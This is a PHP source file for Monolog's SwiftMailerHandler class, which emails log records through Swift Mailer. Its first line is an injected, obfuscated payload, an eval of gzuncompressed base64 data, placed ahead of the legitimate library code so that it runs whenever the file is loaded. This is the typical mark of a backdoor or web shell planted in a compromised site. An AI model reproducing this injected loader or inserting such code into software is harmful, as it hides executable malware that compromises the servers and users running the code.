<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Handler;

use Monolog\Logger;
use Monolog\Formatter\LineFormatter;
use Swift;

/**
 * SwiftMailerHandler uses Swift_Mailer to send the emails
 *
 * @author Gyula Sallai
 */
class SwiftMailerHandler extends MailHandler
{
    protected $mailer;
    private $messageTemplate;

    /**
     * @param \Swift_Mailer           $mailer  The mailer to use
     * @param callable|\Swift_Message $message An example message for real messages, only the body will be replaced
     * @param int                     $level   The minimum logging level at which this handler will be triggered
     * @param Boolean                 $bubble  Whether the messages that are handled can bubble up the stack or not
     */
    public function __construct(\Swift_Mailer $mailer, $message, $level = Logger::ERROR, $bubble = true)
    {
        parent::__construct($level, $bubble);

        $this->mailer = $mailer;
        $this->messageTemplate = $message;
    }

    /**
     * {@inheritdoc}
     */
    protected function send($content, array $records)
    {
        $this->mailer->send($this->buildMessage($content, $records));
    }

    /**
     * Creates instance of Swift_Message to be sent
     *
     * @param  string         $content formatted email body to be sent
     * @param  array          $records Log records that formed the content
     * @return \Swift_Message
     */
    protected function buildMessage($content, array $records)
    {
        $message = null;
        if ($this->messageTemplate instanceof \Swift_Message) {
            $message = clone $this->messageTemplate;
            $message->generateId();
        } elseif (is_callable($this->messageTemplate)) {
            $message = call_user_func($this->messageTemplate, $content, $records);
        }

        if (!$message instanceof \Swift_Message) {
            throw new \InvalidArgumentException('Could not resolve message as instance of Swift_Message or a callable returning it');
        }

        if ($records) {
            $subjectFormatter = new LineFormatter($message->getSubject());
            $message->setSubject($subjectFormatter->format($this->getHighestRecord($records)));
        }

        $message->setBody($content);
        if (version_compare(Swift::VERSION, '6.0.0', '>=')) {
            $message->setDate(new \DateTimeImmutable());
        } else {
            $message->setDate(time());
        }

        return $message;
    }

    /**
     * BC getter, to be removed in 2.0
     */
    public function __get($name)
    {
        if ($name === 'message') {
            trigger_error('SwiftMailerHandler->message is deprecated, use ->buildMessage() instead to retrieve the message', E_USER_DEPRECATED);

            return $this->buildMessage(null, array());
        }

        throw new \InvalidArgumentException('Invalid property '.$name);
    }
}
